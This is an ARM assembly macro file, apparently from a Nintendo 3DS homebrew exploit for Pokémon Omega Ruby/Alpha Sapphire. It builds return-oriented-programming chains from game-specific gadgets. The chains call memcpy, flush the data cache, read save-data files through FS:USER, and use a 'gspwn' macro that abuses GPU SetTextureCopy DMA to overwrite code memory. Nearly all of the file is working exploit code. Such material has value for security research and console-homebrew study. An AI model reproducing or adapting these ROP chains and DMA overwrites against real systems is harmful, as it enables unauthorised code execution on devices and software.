.macro set_lr,_lr
	.word ROP_ORAS_POP_R1PC
			.word ROP_ORAS_NOP ; r1 : pop {pc}
	.word ROP_ORAS_POP_R4LR_BX_R1
			.word 0xDEADC0DE ; r4 : garbage
			.word _lr ; lr
.endmacro

.macro deref_to_r0_and_add,addr,value
	dereference_to_r0 addr 
	.word ROP_ORAS_POP_R1PC
		.word value
	.word ROP_ORAS_ADD_R0_R0R1_POP_R4PC
		.word 0xDEADC0DE ; r4 : garbage
.endmacro

.macro compare_r0_0
	.word ROP_ORAS_CMP_R0_0_MOVNE_R0_1_POP_R4PC
		.word 0xDEADC0DE ; r4 : garbage
.endmacro

.macro r0_and,value
	.word ROP_ORAS_POP_R2R3R4R5R6PC
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word value	; r5
		.word 0xDEADC0DE
	.word ROP_ORAS_AND_R0_R0R5_POP_R4R5R6PC
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
.endmacro

.macro store_to_addr_if_nequal,value,addr
	set_lr ROP_ORAS_NOP
	.word ROP_ORAS_POP_R0PC
		.word value
	.word ROP_ORAS_POP_R1PC
		.word addr ; addr popped
	.word ROP_ORAS_STRNE_R0R1_BX_LR
.endmacro

.macro dereference_to_r0,addr
	.word ROP_ORAS_POP_R0PC
		.word addr ; addr popped
	.word ROP_ORAS_LDR_R0R0_POP_R4PC
		.word 0xDEADC0DE ; r4 : garbage
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr ROP_ORAS_NOP
	.word ROP_ORAS_POP_R0PC
		.word nanosec_low ; r0
	.word ROP_ORAS_POP_R1PC
		.word nanosec_high ; r1
	.word ORAS_SVC_SLEEPTHREAD
.endmacro

.macro memcpy,dst,src,size
	set_lr ROP_ORAS_NOP
	.word ROP_ORAS_POP_R0PC
		.word dst ; r0 : dest
	.word ROP_ORAS_POP_R1PC
		.word src ; r1 : src
	.word ROP_ORAS_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 : size
		.word 0xDEADC0DE ; r3 : garbage
		.word 0xDEADC0DE ; r4 : garbage
		.word 0xDEADC0DE ; r5 : garbage
		.word 0xDEADC0DE ; r6 : garbage
	.word ORAS_MEMCPY
.endmacro

.macro flush_dcache,addr,size
	set_lr ROP_ORAS_NOP
	.word ROP_ORAS_POP_R0PC
		.word ORAS_GSPGPU_HANDLE ; r0 : handle ptr
	.word ROP_ORAS_POP_R1PC
		.word 0xFFFF8001 ; r1 : process handle
	.word ROP_ORAS_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 : addr
		.word size ; r3 : size
		.word 0xDEADC0DE ; r4 : garbage
		.word 0xDEADC0DE ; r5 : garbage
		.word 0xDEADC0DE ; r6 : garbage
	.word ORAS_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,code_linear_base_ptr,VA,src,size
	deref_to_r0_and_add code_linear_base_ptr,VA
	.word ROP_ORAS_POP_R1PC
		.word @@gxCommandPayload+0x8 ; overwrite destination
	.word ROP_ORAS_STR_R0R1_POP_R4PC
		.word 0xDEADC0DE ; r4 : garbage
	set_lr ROP_ORAS_POP_R4R5R6R7R8R9R10R11PC
	.word ROP_ORAS_POP_R0PC
		.word ORAS_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 : nn__gxlow__CTR__detail__GetInterruptReceiver
	.word ROP_ORAS_POP_R1PC
		.word @@gxCommandPayload ; r1 : cmd addr
	.word ORAS_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word 0xDEADC0DE ; destination address overwritten before (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

ARCH_SAVEDATA equ 0x4
PATH_EMPTY equ 0x1
PATH_ASCII equ 0x3
FS_OPEN_READ equ 0x1

.macro FSUSER_OpenFileDirectly,fileHandle,transaction,archiveId,archivePathType,archivePath,archivePathSize,filePathType,filePath,filePathSize,openflags,attributes
	set_lr filePathSize
	.word ROP_ORAS_POP_R0PC
		.word ORAS_FSUSER_HANDLE ; r0 : FS:USER handle
	.word ROP_ORAS_POP_R1PC
		.word archivePathSize ; r1
	.word ROP_ORAS_POP_R2R3R4R5R6PC
		.word transaction ; r2
		.word archiveId ; r3
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
	.word ROP_ORAS_POP_R4R5R6R7R8R9R10R11R12PC
		.word 0xDEADC0DE 
		.word archivePath ; r5
		.word filePath ; r6
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word archivePathType ; r9
		.word filePathType ; r10
		.word openflags ; r11
		.word filePathSize ; r12
	.word ORAS_FSUSER_OPENFILEDIRECTLY + 0x24
		.word 0xDEADC0DE
		.word fileHandle
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
.endmacro

.macro FSFILE_GetSize,fileHandle,out_size
	set_lr ROP_ORAS_NOP
	.word ROP_ORAS_POP_R0PC
		.word fileHandle ; r0
	.word ROP_ORAS_POP_R1PC
		.word out_size ; r1
	.word ORAS_FSFILE_GETSIZE
.endmacro

.macro FSFILE_Read,fileHandle,bytes_read,offsetl,offseth,buffer,size_ptr
	.word ROP_ORAS_POP_R0PC
		.word size_ptr
	.word ROP_ORAS_LDR_R0R0_POP_R4PC ; dereference the size
		.word 0xDEADC0DE ; garbage
	.word ROP_ORAS_POP_R1PC
		.word @@file_size
	.word ROP_ORAS_STR_R0R1_POP_R4PC ; store the size at file_size
		.word 0xDEADC0DE ; garbage
	.word ROP_ORAS_POP_R12PC
@@file_size: 
		.word 0xDEADC0DE ; is overwritten ; r12 : file size
	.word ROP_ORAS_POP_R0PC
		.word fileHandle ; r0
	.word ROP_ORAS_POP_R1PC
		.word buffer ; r1
	.word ROP_ORAS_POP_R2R3R4R5R6PC
		.word offsetl ; r2
		.word offseth ; r3
		.word 0xDEADC0DE
		.word bytes_read ; r5
		.word 0xDEADC0DE ; garbage
	.word ORAS_FSFILE_READ + 0x10
		.word 0xDEADC0DE
		.word 0xDEADC0DE
		.word 0xDEADC0DE
.endmacro
	
.macro FSFILE_Close,fileHandle
	set_lr ROP_ORAS_NOP
	.word ROP_ORAS_POP_R0PC
		.word fileHandle
	.word ORAS_FSFILE_CLOSE
.endmacro

	
	